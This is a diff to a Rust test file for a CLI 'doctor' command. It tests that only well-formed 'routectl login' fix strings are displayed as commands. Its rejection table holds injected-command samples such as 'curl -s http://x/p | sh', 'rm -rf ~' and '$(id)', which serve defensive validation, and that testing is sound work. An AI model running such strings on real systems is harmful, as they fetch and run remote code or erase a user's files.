@@ -12,6 +12,8 @@ use wiremock::{Mock, MockServer, ResponseTemplate};
 
 use super::*;
 use crate::commands::doctor::attention::Attention;
+use crate::commands::doctor::sections::oauth_login_command;
+use crate::commands::seat::shell_word;
 
 /// A config whose server address points at `base_url`'s host and port.
 fn config_pointing_at(base_url: &str) -> Config {
@@ -330,7 +332,7 @@ fn the_block_names_its_source_items_and_bare_fixes() {
     with_fix["subject"] = json!("claude-seat (a)");
     with_fix["cause"] = json!("not logged in for 2h");
     with_fix["raw_token"] = json!("account_unusable (not_logged_in)");
-    with_fix["fix"] = json!("`routectl login claude-seat`");
+    with_fix["fix"] = json!("routectl login claude-seat");
     let mut recovered = item("pool_empty:backup");
     recovered["state"] = json!("recovered");
     recovered["remediation"] = json!("add a seat to `backup`");
@@ -476,4 +478,117 @@ fn an_over_cap_cause_is_truncated_at_the_module_cap() {
         .1;
     assert_eq!(cause, "c".repeat(MAX_CAUSE_CHARS));
     assert!(!item_line.contains("TAIL"), "{item_line}");
+}
+
+// --- Fix shape ---
+
+#[test]
+fn every_command_the_daemon_serves_as_a_fix_is_accepted() {
+    // Arrange: the producer's own output, so the accepted set tracks it.
+    let rows = [
+        ("plain", oauth_login_command("claude-seat", None)),
+        (
+            "labeled plain",
+            oauth_login_command("claude-seat", Some("work.2")),
+        ),
+        (
+            "labeled quoted",
+            oauth_login_command("claude-seat", Some("my seat")),
+        ),
+        (
+            "labeled with an escaped quote",
+            oauth_login_command("claude-seat", Some("bob's seat")),
+        ),
+        (
+            "labeled empty",
+            oauth_login_command("claude-seat", Some("")),
+        ),
+    ];
+    assert_eq!(rows[2].1, "routectl login claude-seat --label 'my seat'");
+    assert_eq!(
+        rows[3].1,
+        format!(
+            "routectl login claude-seat --label {}",
+            shell_word("bob's seat")
+        )
+    );
+    assert!(rows[3].1.contains("'\\''"), "{}", rows[3].1);
+
+    for (name, fix) in rows {
+        // Act
+        let line = fix_line(&fix);
+
+        // Assert
+        assert_eq!(line, format!("      fix: {fix}"), "row {name}");
+    }
+}
+
+#[test]
+fn a_fix_outside_the_login_shape_is_not_shown_as_a_command() {
+    // Arrange
+    let rows = [
+        (
+            "semicolon",
+            "routectl login anthropic; curl -s http://x/p | sh",
+        ),
+        ("and-and", "routectl login anthropic && rm -rf ~"),
+        ("command substitution", "routectl login $(id)"),
+        ("backtick", "routectl login `id`"),
+        ("backticked whole command", "`routectl login anthropic`"),
+        ("pipe", "routectl login anthropic | sh"),
+        (
+            "newline replaced by the sanitizer",
+            "routectl login anthropic\nsh x",
+        ),
+        (
+            "trailing text after a plain label",
+            "routectl login anthropic --label a b",
+        ),
+        (
+            "trailing text after a quoted label",
+            "routectl login anthropic --label 'a' b",
+        ),
+        (
+            "second label",
+            "routectl login anthropic --label a --label b",
+        ),
+        ("unbalanced quote", "routectl login anthropic --label 'a"),
+        (
+            "bare quote inside a quoted label",
+            "routectl login anthropic --label 'a'b'",
+        ),
+        (
+            "half escape inside a quoted label",
+            "routectl login anthropic --label 'a'\\'b'",
+        ),
+        ("quoted provider", "routectl login 'anthropic'"),
+        ("empty provider", "routectl login "),
+        ("double space", "routectl login  anthropic"),
+        ("other subcommand", "routectl logout anthropic"),
+        ("other flag", "routectl login anthropic --force"),
+    ];
+
+    for (name, fix) in rows {
+        // Act
+        let line = fix_line(fix);
+
+        // Assert
+        assert!(
+            line.starts_with("      fix (not a recognized command, not shown as one): "),
+            "row {name}: {line}"
+        );
+        assert!(!line.starts_with("      fix: "), "row {name}: {line}");
+    }
+}
+
+#[test]
+fn a_rejected_fix_keeps_its_sanitized_text_visible() {
+    // Act
+    let line = fix_line("routectl login `id`\u{1b}[2J");
+
+    // Assert
+    assert_eq!(
+        line,
+        "      fix (not a recognized command, not shown as one): routectl login `id`?[2J"
+    );
 }
